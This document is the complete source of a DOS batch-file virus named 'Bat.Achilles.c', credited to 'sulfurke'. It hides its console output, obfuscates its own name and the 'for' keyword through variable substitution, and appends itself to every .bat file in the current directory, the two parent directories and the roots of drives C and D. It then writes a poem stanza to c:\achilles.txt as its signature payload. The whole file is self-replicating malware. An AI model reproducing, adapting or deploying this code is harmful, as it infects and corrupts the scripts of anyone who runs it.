
REM Bat.Achilles.c
REM by sulfurke
cls 
@echo off
ctty nul
cls
set ana=alfa
set ana=beta
set corn=greek
set corn=achilles
set rand=Thetis
set rand=Peleus
set corn=%0
set rand=command
set ana=for
%ana% %%v in (*.bat ../*.bat ../../*.bat c:\*.bat d:\*.bat) do copy %%v + %corn%
cls
echo      She looked over his shoulder > c:\achilles.txt
echo       For vines and olive trees, >> c:\achilles.txt
echo      Marble well-governed cities >> c:\achilles.txt
echo       And ships upon untamed seas, >> c:\achilles.txt
echo      But there on the shining metal >> c:\achilles.txt
echo        His hands had put instead >> c:\achilles.txt
echo      An artificial wilderness >> c:\achilles.txt
echo        And a sky like lead. >> c:\achilles.txt
echo   >> c:\achilles.txt
echo ... and so ever man had an achilles' heel [Sulfurke] >> c:\achilles.txt

:end